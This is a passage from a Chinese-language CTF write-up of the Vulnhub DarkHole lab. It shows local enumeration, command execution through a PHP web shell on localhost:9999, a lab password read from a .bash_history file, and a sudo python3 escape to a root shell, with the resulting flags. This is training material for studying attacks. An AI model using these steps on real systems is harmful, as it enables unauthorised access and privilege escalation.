+</span></span></code></pre></td></tr></table></div></div><h3 id=在jehad用户权限上信息信息收集>在jehad用户权限上信息信息收集</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ whoami
+</span></span><span class=line><span class=cl>jehad
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/home/jehad
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ uname -a
+</span></span><span class=line><span class=cl>Linux darkhole 5.4.0-81-generic <span class=c1>#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>jehad<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>jehad<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>jehad<span class=o>)</span>
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ ls -liah
+</span></span><span class=line><span class=cl>total 36K
+</span></span><span class=line><span class=cl><span class=m>688411</span> drwxr-xr-x <span class=m>5</span> jehad jehad 4.0K Sep  <span class=m>3</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>655361</span> drwxr-xr-x <span class=m>5</span> root  root  4.0K Sep  <span class=m>2</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>684142</span> -rw------- <span class=m>1</span> jehad jehad 3.1K Sep  <span class=m>3</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>684131</span> -rw-r--r-- <span class=m>1</span> jehad jehad  <span class=m>220</span> Sep  <span class=m>2</span>  <span class=m>2021</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>684132</span> -rw-r--r-- <span class=m>1</span> jehad jehad 3.7K Sep  <span class=m>2</span>  <span class=m>2021</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>688412</span> drwx------ <span class=m>2</span> jehad jehad 4.0K Sep  <span class=m>2</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>688416</span> drwxrwxr-x <span class=m>3</span> jehad jehad 4.0K Sep  <span class=m>2</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>684133</span> -rw-r--r-- <span class=m>1</span> jehad jehad  <span class=m>807</span> Sep  <span class=m>2</span>  <span class=m>2021</span> .profile
+</span></span><span class=line><span class=cl><span class=m>688420</span> drwx------ <span class=m>2</span> jehad jehad 4.0K Sep  <span class=m>3</span>  <span class=m>2021</span> .ssh
+</span></span></code></pre></td></tr></table></div></div><h3 id=尝试sudo和suid提权无果>尝试sudo和suid提权无果</h3><p>可以尝试提一下权</p><p>在我自己的Linux提权流程中：</p><ol><li>系统信息（<code>uname</code>、<code>id</code>）</li><li>SUID / sudo（<code>find</code>、<code>sudo</code>）</li><li>计划任务（<code>cron</code>）</li><li>网络与端口（<code>netstat</code>、<code>ss</code>）</li><li>进程与服务（<code>ps aux</code>）</li><li>敏感文件（<code>.bash_history</code>、配置文件）</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ sudo -l
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> jehad: 
+</span></span><span class=line><span class=cl>Sorry, user jehad may not run sudo on darkhole.
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/fusermount
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/pkexec
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/umount
+</span></span><span class=line><span class=cl>/usr/bin/mount
+</span></span><span class=line><span class=cl>/usr/bin/su
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/snap/core18/1944/bin/mount
+</span></span><span class=line><span class=cl>/snap/core18/1944/bin/ping
+</span></span><span class=line><span class=cl>/snap/core18/1944/bin/su
+</span></span><span class=line><span class=cl>/snap/core18/1944/bin/umount
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/chfn
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/chsh
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/passwd
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/bin/sudo
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/snap/core18/1944/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/snap/core18/2128/bin/mount
+</span></span><span class=line><span class=cl>/snap/core18/2128/bin/ping
+</span></span><span class=line><span class=cl>/snap/core18/2128/bin/su
+</span></span><span class=line><span class=cl>/snap/core18/2128/bin/umount
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/chfn
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/chsh
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/passwd
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/bin/sudo
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/snap/core18/2128/usr/lib/openssh/ssh-keysign
+</span></span></code></pre></td></tr></table></div></div><p>sudo 明确不行，suid 都是系统文件</p><h3 id=计划任务提权尝试>计划任务提权尝试</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ crontab -l
+</span></span><span class=line><span class=cl>no crontab <span class=k>for</span> jehad
+</span></span></code></pre></td></tr></table></div></div><p>计划任务也没有任何信息</p><h3 id=本地服务枚举>本地服务枚举</h3><p>计划任务没有收获，接下来看本机监听了哪些端口。外部 nmap 只能扫到 22 和 80，但登录后可以看到只监听 <code>127.0.0.1</code> 的内部服务。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ ss -tulpn
+</span></span><span class=line><span class=cl>Netid               State                 Recv-Q                Send-Q                                    Local Address:Port                                Peer Address:Port               Process               
+</span></span><span class=line><span class=cl>udp                 UNCONN                <span class=m>0</span>                     <span class=m>0</span>                                    10.10.10.138%ens33:68                                       0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>udp                 UNCONN                <span class=m>0</span>                     <span class=m>0</span>                                         127.0.0.53%lo:53                                       0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>70</span>                                            127.0.0.1:33060                                    0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>151</span>                                           127.0.0.1:3306                                     0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>4096</span>                                          127.0.0.1:9999                                     0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>4096</span>                                      127.0.0.53%lo:53                                       0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>128</span>                                             0.0.0.0:22                                       0.0.0.0:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>511</span>                                                   *:80                                             *:*                                        
+</span></span><span class=line><span class=cl>tcp                 LISTEN                <span class=m>0</span>                     <span class=m>128</span>                                                <span class=o>[</span>::<span class=o>]</span>:22                                          <span class=o>[</span>::<span class=o>]</span>:*                                        
+</span></span><span class=line><span class=cl>jehad@darkhole:~$ netstat -tulpn
+</span></span><span class=line><span class=cl><span class=o>(</span>Not all processes could be identified, non-owned process info
+</span></span><span class=line><span class=cl> will not be shown, you would have to be root to see it all.<span class=o>)</span>
+</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
+</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::80                   :::*                    LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::22                   :::*                    LISTEN      -                   
+</span></span><span class=line><span class=cl>udp        <span class=m>0</span>      <span class=m>0</span> 10.10.10.138:68         0.0.0.0:*                           -                   
+</span></span><span class=line><span class=cl>udp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*                           -  
+</span></span></code></pre></td></tr></table></div></div><p>两条命令均验证了9999端口正在被监听</p><h3 id=查看9999端口进程>查看9999端口进程</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ ps aux <span class=p>|</span> grep -i <span class=m>9999</span>
+</span></span><span class=line><span class=cl>losy        <span class=m>1903</span>  0.0  0.0   <span class=m>2608</span>   <span class=m>612</span> ?        Ss   14:30   0:00 /bin/sh -c  <span class=nb>cd</span> /opt/web <span class=o>&amp;&amp;</span> php -S localhost:9999
+</span></span><span class=line><span class=cl>losy        <span class=m>1906</span>  0.0  0.4 <span class=m>193672</span> <span class=m>18832</span> ?        S    14:30   0:00 php -S localhost:9999
+</span></span><span class=line><span class=cl>jehad      <span class=m>12551</span>  0.0  0.0   <span class=m>6300</span>   <span class=m>668</span> pts/0    S+   18:27   0:00 grep --color<span class=o>=</span>auto -i <span class=m>9999</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以发现 losy 用户在跑 php -S localhost:9999，工作目录是 /opt/web</p><p>继续看看服务对外提供什么</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ curl -i http://127.0.0.1:9999
+</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>Host: 127.0.0.1:9999
+</span></span><span class=line><span class=cl>Date: Fri, <span class=m>18</span> Sep <span class=m>2026</span> 18:30:24 GMT
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>X-Powered-By: PHP/7.4.3
+</span></span><span class=line><span class=cl>Content-type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
+</span></span><span class=line><span class=cl>Parameter GET<span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>服务是活的，PHP 7.4.3，Parameter GET[&lsquo;cmd&rsquo;]，意思是它接收 ?cmd= 参数，并且大概率会把参数值当命令执行。这就是典型的命令执行马</p><h3 id=验证命令执行>验证命令执行</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ curl <span class=s2>&#34;http://127.0.0.1:9999/?cmd=id&#34;</span>
+</span></span><span class=line><span class=cl>Parameter GET<span class=o>[</span><span class=s1>&#39;cmd&#39;</span><span class=o>]</span><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>losy<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>命令执行确认成功，现在是以 losy 身份执行命令。接下来按顺序拿凭据、切用户、提权</p><h3 id=读-losy-的-bash_history>读 losy 的 .bash_history</h3><p><code>.bash_history</code> 本身并不是漏洞，而是敏感操作痕迹泄露。其危险性取决于文件权限以及当前用户是否能够读取目标用户的历史记录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>curl <span class=s2>&#34;http://127.0.0.1:9999/?cmd=cat%20/home/losy/.bash_history&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我提取重要的出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>P0assw0rd losy:gang
+</span></span><span class=line><span class=cl>php -S localhost:9999
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>sudo python3 -c <span class=s1>&#39;import os; os.system(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>sudo /usr/bin/python3 -c <span class=s1>&#39;import os; os.system(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>mysql -e <span class=s1>&#39;\! /bin/bash&#39;</span>
+</span></span><span class=line><span class=cl>mysql -u root -p -e <span class=s1>&#39;\! /bin/bash&#39;</span>
+</span></span><span class=line><span class=cl>su lama
+</span></span><span class=line><span class=cl>ssh-keygen -t rsa -b <span class=m>4096</span>
+</span></span><span class=line><span class=cl>chmod <span class=m>777</span> .ssh/
+</span></span><span class=line><span class=cl>chmod <span class=m>666</span> id_rsa
+</span></span></code></pre></td></tr></table></div></div><p>得知</p><ol><li><strong>密码泄露</strong>：P0assw0rd losy:gang losy用户的密码是 gang。</li><li><strong>提权命令</strong>：sudo python3 -c &lsquo;import os; os.system("/bin/sh")&rsquo; 或 sudo /usr/bin/python3 -c &lsquo;import os; os.system("/bin/sh")&rsquo; 表明 <code>losy</code> 可以免密执行 /usr/bin/python3，直接用来提权到 root。</li></ol><h2 id=先切换到losy账户获取user-flag>先切换到losy账户,获取user flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jehad@darkhole:~$ su losy
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl>losy@darkhole:/home/jehad$
+</span></span><span class=line><span class=cl>losy@darkhole:/home/jehad$ <span class=nb>cd</span> /home/losy
+</span></span><span class=line><span class=cl>losy@darkhole:~$ ls -liah
+</span></span><span class=line><span class=cl>total 36K
+</span></span><span class=line><span class=cl><span class=m>688413</span> drwxr-xr-x <span class=m>4</span> losy losy 4.0K Sep  <span class=m>3</span>  <span class=m>2021</span> .
+</span></span><span class=line><span class=cl><span class=m>655361</span> drwxr-xr-x <span class=m>5</span> root root 4.0K Sep  <span class=m>2</span>  <span class=m>2021</span> ..
+</span></span><span class=line><span class=cl><span class=m>684141</span> -rw------- <span class=m>1</span> losy losy 1.1K Sep  <span class=m>3</span>  <span class=m>2021</span> .bash_history
+</span></span><span class=line><span class=cl><span class=m>684135</span> -rw-r--r-- <span class=m>1</span> losy losy  <span class=m>220</span> Sep  <span class=m>2</span>  <span class=m>2021</span> .bash_logout
+</span></span><span class=line><span class=cl><span class=m>684136</span> -rw-r--r-- <span class=m>1</span> losy losy 3.7K Sep  <span class=m>2</span>  <span class=m>2021</span> .bashrc
+</span></span><span class=line><span class=cl><span class=m>688414</span> drwx------ <span class=m>2</span> losy losy 4.0K Sep  <span class=m>2</span>  <span class=m>2021</span> .cache
+</span></span><span class=line><span class=cl><span class=m>688423</span> drwxrwxr-x <span class=m>3</span> losy losy 4.0K Sep  <span class=m>3</span>  <span class=m>2021</span> .local
+</span></span><span class=line><span class=cl><span class=m>684137</span> -rw-r--r-- <span class=m>1</span> losy losy  <span class=m>807</span> Sep  <span class=m>2</span>  <span class=m>2021</span> .profile
+</span></span><span class=line><span class=cl><span class=m>684144</span> -rw-rw-r-- <span class=m>1</span> losy losy   <span class=m>55</span> Sep  <span class=m>3</span>  <span class=m>2021</span> user.txt
+</span></span><span class=line><span class=cl>losy@darkhole:~$ cat user.txt
+</span></span><span class=line><span class=cl>DarkHole<span class=o>{</span><span class=s1>&#39;This_is_the_life_man_better_than_a_cruise&#39;</span><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=提权至root获取rootflag>提权至root,获取rootflag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>losy@darkhole:~$ sudo python3 -c <span class=s1>&#39;import os; os.system(&#34;/bin/sh&#34;)&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># whoami</span>
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl><span class=c1># pwd</span>
+</span></span><span class=line><span class=cl>/home/losy
+</span></span><span class=line><span class=cl><span class=c1># id</span>
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># cd /root</span>
+</span></span><span class=line><span class=cl><span class=c1># ls</span>
+</span></span><span class=line><span class=cl>root.txt  snap
+</span></span><span class=line><span class=cl><span class=c1># cat root.txt</span>
+</span></span><span class=line><span class=cl>DarkHole<span class=o>{</span><span class=s1>&#39;Legend&#39;</span><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=4.0.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
